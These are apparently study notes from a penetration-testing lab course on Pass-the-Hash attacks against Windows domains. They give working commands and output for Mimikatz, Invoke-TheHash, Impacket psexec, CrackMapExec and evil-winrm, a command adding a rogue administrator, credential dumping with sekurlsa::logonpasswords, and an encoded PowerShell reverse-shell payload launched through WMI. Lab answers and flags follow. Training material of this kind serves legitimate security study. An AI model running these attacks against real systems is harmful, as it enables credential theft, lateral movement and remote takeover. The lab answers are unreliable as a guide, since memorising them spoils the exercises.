@@ -1,1 +1,187 @@
 
+Pass the Hash (PtH)
+A Pass the Hash (PtH) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn't need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.
+
+As discussed in the previous sections, the attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash. Hashes can be obtained in several ways, including:
+
+* Dumping the local SAM database from a compromised host.
+* Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
+* Pulling the hashes from memory (lsass.exe).
+* Let's assume we obtain the password hash (64F12CDDAA88057E06A81B54E73B949B) for the account julio from the domain inlanefreight.htb. Let's see how we can perform 
+
+Pass the Hash attacks from Windows and Linux machines.
+
+Note: The tools we will be using are located in the C:\tools directory on the target host. Once you start the machine and complete the exercises, you can use the tools in that directory. This lab contains two machines, you will have access to one (MS01), and from there, you will connect to the second machine (DC01).
+
+With NTLM, passwords stored on the server and domain controller are not "salted," which means that an adversary with a password hash can authenticate a session without knowing the original password. We call this a Pass the Hash (PtH) Attack.
+
+Pass the Hash with Mimikatz (Windows)
+The first tool we will use to perform a Pass the Hash attack is Mimikatz. Mimikatz has a module named sekurlsa::pth that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password. To use this module, we will need the following:
+
+* /user - The user name we want to impersonate.
+* /rc4 or /NTLM - NTLM hash of the user's password.
+* /domain - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
+* /run - The program we want to run with the user's context (if not specified, it will launch cmd.exe).
+
+Mimikatz Example: 
+c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
+user    : julio
+domain  : inlanefreight.htb
+program : cmd.exe
+impers. : no
+NTLM    : 64F12CDDAA88057E06A81B54E73B949B
+  |  PID  8404
+  |  TID  4268
+  |  LSA Process was already R/W
+  |  LUID 0 ; 5218172 (00000000:004f9f7c)
+  \_ msv1_0   - data copy @ 0000028FC91AB510 : OK !
+  \_ kerberos - data copy @ 0000028FC964F288
+   \_ des_cbc_md4       -> null
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ *Password replace @ 0000028FC9673AE8 (32) -> null
+
+Now we can use cmd.exe to execute commands in the user's context. For this example, julio can connect to a shared folder named julio on the DC
+
+Pass the Hash with PowerShell Invoke-TheHash (Windows)
+Another tool we can use to perform Pass the Hash attacks on Windows is Invoke-TheHash. This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer. For this example we will use the user julio and the hash 64F12CDDAA88057E06A81B54E73B949B.
+
+When using Invoke-TheHash, we have two options: SMB or WMI command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:
+
+* Target - Hostname or IP address of the target.
+* Username - Username to use for authentication.
+* Domain - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
+* Hash - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
+* Command - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.
+The following command will use the SMB method for command execution to create a new user named mark and add the user to the Administrators group.
+Invoke-TheHash with SMB
+
+PS c:\htb> cd C:\tools\Invoke-TheHash\
+PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
+PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
+
+VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
+VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
+VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
+VERBOSE: [*] Trying to execute command on 172.16.1.10
+[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
+VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
+
+Pass the Hash with Impacket (Linux)
+Impacket has several tools we can use for different operations such as Command Execution and Credential Dumping, Enumeration, etc. For this example, we will perform command execution on the target machine using PsExec.
+
+Pass the Hash with Impacket PsExec
+
+SYNTAX: MJBUCKNER@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.129.201.126.....
+[*] Found writable share ADMIN$
+[*] Uploading file SLUBMRXK.exe
+[*] Opening SVCManager on 10.129.201.126.....
+[*] Creating service AdzX on 10.129.201.126.....
+[*] Starting service AdzX.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.19044.1415]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+
+Pass the Hash with CrackMapExec
+
+SYNTAX: MJBUCKNER@htb[/htb]# crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
+
+SMB         172.16.1.10   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:.) (signing:True) (SMBv1:False)
+SMB         172.16.1.10   445    DC01             [-] .\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 STATUS_LOGON_FAILURE 
+SMB         172.16.1.5    445    MS01             [*] Windows 10.0 Build 19041 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:False)
+SMB         172.16.1.5    445    MS01             [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
+
+CrackMapExec - Command Execution
+SYNTAX: MJBUCKNER@htb[/htb]# crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
+
+SMB         10.129.201.126  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
+SMB         10.129.201.126  445    MS01            [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
+SMB         10.129.201.126  445    MS01            [+] Executed command 
+SMB         10.129.201.126  445    MS01            MS01\administrator
+
+
+
+
+CHALLENGE: 10.129.204.23
+
+
+Question 1  Authenticate to 10.129.204.23 (ACADEMY-PWATTACKS-LM-MS01) with user "Administrator" and password "30B3783CE2ABF1AF70F77D0660CF3453" - Access the target machine using any Pass-the-Hash tool. Submit the contents of the file located at C:\pth.txt.
+1) impacket-psexec administrator@10.129.204.23 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+2) type C:\pth.txt
+G3t_4CCE$$_V1@_PTH
+
+
+Question 2 - Try to connect via RDP using the Administrator hash. What is the name of the registry value that must be set to 0 for PTH over RDP to work? Change the registry key value and connect using the hash with RDP. Submit the name of the registry value name as the answer. - DisableRestrictedAdmin
+1) evil-winrm -i 10.129.204.23 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
+2) reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+
+Question 3 RDP to 10.129.204.23 (ACADEMY-PWATTACKS-LM-MS01) with user "Administrator" and password "30B3783CE2ABF1AF70F77D0660CF3453" - Connect via RDP and use Mimikatz located in c:\tools to extract the hashes presented in the current session. What is the NTLM/RC4 hash of David's account? 
+1) xfreerdp /v:10.129.204.23 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453 /dynamic-resolution
+2) open cmd prompt as admin 
+3) cd C:\tools -> mimikatz.exe 
+4) privilege::debug
+5) sekurlsa::logonpasswords 
+6) output 
+ Username : julio
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 64f12cddaa88057e06a81b54e73b949b
+         * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8
+         * DPAPI    : 634db497baef212b777909a4ccaaf700
+ * Username : david
+         * Domain   : INLANEFREIGHT
+         * NTLM     : c39f2beb3d2ec06a62cb887fb391dee0
+         * SHA1     : 2277c28035275149d01a8de530cc13b74f59edfb
+         * DPAPI    : eaa6db50c1544304014d858928d9694f
+        tspkg :
+
+
+Question 4 - Using David's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\david and read the file david.txt.
+1) from previous RDP session open new command prompt as admin -> cd C:\tools -> mimikatz.exe 
+2) in mimikatz type this -> privilege::debug
+sekurlsa::pth /user:david /domain:inlanefreight.htb /rc4:c39f2beb3d2ec06a62cb887fb391dee0
+3) this wil lspawn a cmd prompt as david -> 
+4) more \\dc01\david\david.txt 
+D3V1d_Fl5g_is_Her3
+
+Question 5 - Using Julio's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\julio and read the file julio.txt.
+1) same steps as above but change user to julio and use his hash 
+2) in mimikatz type -> 
+privilege::debug
+sekurlsa::pth /user:julio /domain:inlanefreight.htb /rc4:64f12cddaa88057e06a81b54e73b949b
+
+3) once cmd prompt spawns -> 
+more \\dc01\julio\julio.txt
+
+JuL1()_SH@re_fl@g
+
+Question 6 - Using Julio's hash, perform a Pass the Hash attack, launch a PowerShell console and import Invoke-TheHash to create a reverse shell to the machine you are connected via RDP (the target machine, DC01, can only connect to MS01). Use the tool nc.exe located in c:\tools to listen for the reverse shell. Once connected to the DC01, read the flag in C:\julio\flag.txt.
+
+1) xfreerdp /v:10.129.204.23 /u:julio /pth:64f12cddaa88057e06a81b54e73b949b /dynamic-resolution
+2) open PowerShell, navigate to C:\Tools\Invoke-TheHash and then import the module Invoke-TheHash:
+3) cd C:\tools\Invoke-TheHash\
+Import-Module .\Invoke-TheHash.psd1
+4) open Command Prompt, navigate to C:\Tools\, and start an nc listener: -> C:\Users\julio>C:\tools\nc.exe -lvnp 8001
+
+listening on [any] 8001 ...
+5) www.revshells.com and generate a Powershell #3 (Base64) payload:
+6) use this payload along with Invoke-WMIExec to pass the Hash as Julio, utilizing the NTLM hash 64f12cddaa88057e06a81b54e73b949b that was attained previously, therefore triggering a reverse shell:
+7) PS C:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwAOAAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
+
+[+] Command executed with process ID 3124 on DC01
+
+8) listening on [any] 8001 ...
+connect to [172.16.1.5] from (UNKNOWN) [172.16.1.10] 49774
+
+cat C:\julio\flag.txt
+
+JuL1()_N3w_fl@g 
